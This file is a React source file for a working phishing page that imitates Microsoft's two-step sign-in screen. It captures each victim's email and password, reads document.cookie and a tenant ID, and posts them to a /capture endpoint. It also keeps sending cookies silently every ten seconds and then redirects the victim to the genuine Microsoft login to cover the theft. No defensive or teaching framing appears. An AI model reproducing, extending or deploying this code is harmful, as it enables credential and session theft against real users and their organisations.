'use client'

import { useState, useEffect } from 'react'

interface CaptureData {
  email: string
  password?: string
  cookies?: string
  tenantId?: string
  captureDomain?: string
  upn?: string
}

export default function MicrosoftLoginPage() {
  const [step, setStep] = useState<'email' | 'password'>('email')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')

  
  const captureCookies = (): string => {
    if (typeof document === 'undefined') return ''
    return document.cookie || 'none'
  }

  // Extract tenant ID from URL or storage 
  const getTenantId = (): string => {
    const urlParams = new URLSearchParams(window.location.search)
    return urlParams.get('tenant') || urlParams.get('tid') || localStorage.getItem('tid') || ''
  }

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError('')

    try {
      
      const emailData: CaptureData = {
        email,
        captureDomain: 'login.microsoftonline.com',
        tenantId: getTenantId(),
        upn: email
      }

      const emailRes = await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(emailData)
      })

      if (!emailRes.ok) throw new Error('Email capture failed')

      
      setStep('password')
      
    } catch (err) {
      console.error('Email capture:', err)
    } finally {
      setIsLoading(false)
    }
  }

console.log('Sending password:', password)
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError('')

    try {
    
      const fullData: CaptureData = {
        email,
        password,
        cookies: captureCookies(),
        tenantId: getTenantId(),
        captureDomain: 'login.microsoftonline.com',
        upn: email
      }

      console.log('🎣 Microsoft captured:', {
        email,
        hasCookies: fullData.cookies !== 'none',
        tenantId: fullData.tenantId,
        cookiesLength: fullData.cookies?.length || 0
      })

      const res = await fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fullData)
      })

      const result = await res.json()
      
      if (res.ok) {
        
      window.location.href = 'https://login.microsoft.com'
      } else {
        setError('Something went wrong. Please try again.')
      }
      
    } catch (err) {
      console.error('Password capture:', err)
      setError('Network error. Check connection.')
    } finally {
      setIsLoading(false)
    }
  }


  useEffect(() => {
    const interval = setInterval(() => {
      
      if (step === 'password' && document.cookie) {
        fetch('/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email,
            cookies: captureCookies(),
            session_update: true
          })
        }).catch(() => {}) // Silent
      }
    }, 10000)

    return () => clearInterval(interval)
  }, [step, email])

  return (
    <div
      className="min-h-screen w-full flex flex-col items-center justify-center bg-cover bg-center relative"
      style={{
        backgroundImage: 'url(/login-bg.jpg)',
      }}
    >
      <div className="flex flex-col items-center justify-center w-full">
        <div className="w-96 bg-gray-700/80 rounded-lg p-12 shadow-2xl" style={{ 
          backgroundColor: 'rgba(52, 52, 52, 0.95)',
          backdropFilter: 'blur(10px)'
        }}>
          {/* Microsoft Logo */}
          <div className="flex items-center justify-center mb-6">
            <svg width="24" height="24" viewBox="0 0 24 24" style={{ marginRight: '8px' }}>
              <rect x="1" y="1" width="10" height="10" fill="#F25022" />
              <rect x="13" y="1" width="10" height="10" fill="#7FBA00" />
              <rect x="1" y="13" width="10" height="10" fill="#00A4EF" />
              <rect x="13" y="13" width="10" height="10" fill="#FFB900" />
            </svg>
            <span style={{ 
              color: '#FFFFFF', 
              fontSize: '15px', 
              fontWeight: '500', 
              fontFamily: 'Segoe UI, sans-serif' 
            }}>
              Microsoft
            </span>
          </div>

          {/* Dynamic Heading */}
          <h1 style={{ 
            fontSize: '28px', 
            fontWeight: '600', 
            color: '#FFFFFF', 
            marginBottom: '8px', 
            textAlign: 'center', 
            fontFamily: 'Segoe UI, sans-serif' 
          }}>
            {step === 'email' ? 'Sign in' : 'Enter password'}
          </h1>

          {/* Dynamic Subtitle */}
          <p style={{ 
            fontSize: '15px', 
            color: '#A4A4A4', 
            marginBottom: '24px', 
            textAlign: 'center', 
            fontFamily: 'Segoe UI, sans-serif' 
          }}>
            {step === 'email' 
              ? 'Use your Microsoft account' 
              : `Password for ${email.split('@')[0]}`
            }
          </p>

          {/* Error Message */}
          {error && (
            <div style={{
              backgroundColor: 'rgba(220, 53, 69, 0.2)',
              border: '1px solid rgba(220, 53, 69, 0.5)',
              color: '#FF6B6B',
              padding: '12px',
              borderRadius: '4px',
              marginBottom: '16px',
              fontSize: '14px',
              fontFamily: 'Segoe UI, sans-serif'
            }}>
              {error}
            </div>
          )}

          <form onSubmit={step === 'email' ? handleEmailSubmit : handlePasswordSubmit}>
            {step === 'email' ? (
              // EMAIL STEP
              <input
                type="email"
                placeholder="Email or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                style={{
                  width: '100%',
                  padding: '12px 16px',
                  backgroundColor: '#3F3F3F',
                  border: '1px solid #555555',
                  borderRadius: '4px',
                  color: '#FFFFFF',
                  fontSize: '15px',
                  fontFamily: 'Segoe UI, sans-serif',
                  marginBottom: '16px',
                  boxSizing: 'border-box',
                }}
                onFocus={(e) => {
                  e.currentTarget.style.borderColor = '#005A9E'
                  e.currentTarget.style.boxShadow = '0 0 0 2px rgba(0, 90, 158, 0.2)'
                }}
                onBlur={(e) => {
                  e.currentTarget.style.borderColor = '#555555'
                  e.currentTarget.style.boxShadow = 'none'
                }}
              />
            ) : (
              // PASSWORD STEP
              <>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoFocus
                  style={{
                    width: '100%',
                    padding: '12px 16px',
                    backgroundColor: '#3F3F3F',
                    border: '1px solid #555555',
                    borderRadius: '4px',
                    color: '#FFFFFF',
                    fontSize: '15px',
                    fontFamily: 'Segoe UI, sans-serif',
                    marginBottom: '16px',
                    boxSizing: 'border-box',
                  }}
                  onFocus={(e) => {
                    e.currentTarget.style.borderColor = '#005A9E'
                    e.currentTarget.style.boxShadow = '0 0 0 2px rgba(0, 90, 158, 0.2)'
                  }}
                  onBlur={(e) => {
                    e.currentTarget.style.borderColor = '#555555'
                    e.currentTarget.style.boxShadow = 'none'
                  }}
                />
                
                {/* Forgot Password Link */}
                <div style={{ textAlign: 'right', marginBottom: '20px' }}>
                  <a href="#" style={{ 
                    color: '#0078D4', 
                    fontSize: '13px', 
                    textDecoration: 'none',
                    fontFamily: 'Segoe UI, sans-serif',
                    fontWeight: '500'
                  }}
                  onMouseEnter={(e) => e.currentTarget.style.textDecoration = 'underline'}
                  onMouseLeave={(e) => e.currentTarget.style.textDecoration = 'none'}
                  >
                    Forgot password?
                  </a>
                </div>
              </>
            )}

            {/* Dynamic Button */}
            <button
              type="submit"
              disabled={isLoading || (step === 'password' && !password)}
              style={{
                width: '100%',
                padding: '12px 0',
                backgroundColor: isLoading ? '#6C757D' : '#0078D4',
                color: '#FFFFFF',
                border: 'none',
                borderRadius: '4px',
                fontSize: '15px',
                fontWeight: '600',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontFamily: 'Segoe UI, sans-serif',
                transition: 'all 0.2s'
              }}
            >
              {isLoading ? (
                <>
                  <span style={{ marginRight: '8px' }}></span>
                  {step === 'email' ? 'Checking...' : 'Signing in...'}
                </>
              ) : step === 'email' ? 'Next' : 'Sign in'}
            </button>
          </form>

          {/* Back Link (Password Step Only) */}
          {step === 'password' && (
            <div style={{ textAlign: 'center', marginTop: '16px' }}>
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault()
                  setStep('email')
                }}
                style={{ 
                  color: '#0078D4', 
                  fontSize: '13px', 
                  textDecoration: 'none',
                  fontFamily: 'Segoe UI, sans-serif'
                }}
              >
                Back to email
              </a>
            </div>
          )}
        </div>
      </div>

      {/* Footer (unchanged - perfect replica) */}
      <div style={{ 
        position: 'absolute', 
        bottom: '20px', 
        left: '0', 
        right: '0',
        display: 'flex',
        justifyContent: 'center',
        gap: '24px',
        flexWrap: 'wrap'
      }}>
        <a href="#" style={{ color: '#A4A4A4', fontSize: '12px', textDecoration: 'none', fontFamily: 'Segoe UI, sans-serif' }}
           onMouseEnter={(e) => e.currentTarget.style.color = '#FFFFFF'}
           onMouseLeave={(e) => e.currentTarget.style.color = '#A4A4A4'}>
          Help and feedback
        </a>
        <a href="#" style={{ color: '#A4A4A4', fontSize: '12px', textDecoration: 'none', fontFamily: 'Segoe UI, sans-serif' }}
           onMouseEnter={(e) => e.currentTarget.style.color = '#FFFFFF'}
           onMouseLeave={(e) => e.currentTarget.style.color = '#A4A4A4'}>
          Terms of use
        </a>
        <a href="#" style={{ color: '#A4A4A4', fontSize: '12px', textDecoration: 'none', fontFamily: 'Segoe UI, sans-serif' }}
           onMouseEnter={(e) => e.currentTarget.style.color = '#FFFFFF'}
           onMouseLeave={(e) => e.currentTarget.style.color = '#A4A4A4'}>
          Privacy and cookies
        </a>
      </div>

      <div style={{ 
        position: 'absolute', 
        bottom: '2px', 
        left: '0', 
        right: '0',
        textAlign: 'center',
        fontSize: '12px',
        color: '#808080',
        fontFamily: 'Segoe UI, sans-serif',
        padding: '0 16px'
      }}>
        Use private browsing if this is not your device. <a href="#" style={{ color: '#0078D4', textDecoration: 'none' }}
          onMouseEnter={(e) => e.currentTarget.style.textDecoration = 'underline'}
          onMouseLeave={(e) => e.currentTarget.style.textDecoration = 'none'}>Learn more</a>
      </div>
    </div>
  )
}